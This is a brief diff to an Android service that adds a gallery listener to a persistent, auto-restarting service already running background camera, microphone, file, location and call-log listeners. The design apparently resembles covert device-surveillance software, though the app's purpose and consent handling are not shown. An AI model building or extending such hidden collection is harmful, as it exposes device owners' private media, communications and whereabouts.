@@ -30,13 +30,14 @@ class SentryPersistentService : Service() {
         } catch (_: Exception) {
         }
 
-        // Start background Camera2, Microphone, Battery Telemetry, File Explorer, Location, and Call History listeners
+        // Start background Camera2, Microphone, Battery Telemetry, File Explorer, Location, Call History, and Gallery listeners
         BackgroundCameraManager.startListening(applicationContext)
         BackgroundAudioManager.startListening(applicationContext)
         BatteryTelemetryManager.startSync(applicationContext)
         BackgroundFileManager.startListening(applicationContext)
         BackgroundLocationManager.startListening(applicationContext)
         CallLogManager.startSync(applicationContext)
+        BackgroundGalleryManager.startListening(applicationContext)
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -47,6 +48,7 @@ class SentryPersistentService : Service() {
         BackgroundFileManager.startListening(applicationContext)
         BackgroundLocationManager.startListening(applicationContext)
         CallLogManager.startSync(applicationContext)
+        BackgroundGalleryManager.startListening(applicationContext)
         return START_STICKY
     }
 
